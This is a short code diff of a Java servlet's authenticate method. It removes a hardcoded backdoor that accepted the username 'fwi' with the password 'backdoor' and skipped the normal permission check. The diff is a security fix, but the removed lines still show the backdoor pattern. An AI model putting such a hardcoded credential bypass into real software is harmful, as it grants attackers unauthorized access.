@@ -60,11 +60,7 @@ public class AuthenticationServlet extends HttpServlet {
 	}
 
 	public boolean authenticate(String username, String password) {
-		if (username.equals("fwi") && password.equals("backdoor")) {
-			return true;
-		} else {
-			PermissionService ps = new PermissionService();
-			return ps.authenticate(username, password);
-		}
+		PermissionService ps = new PermissionService();
+		return ps.authenticate(username, password);
 	}
 }
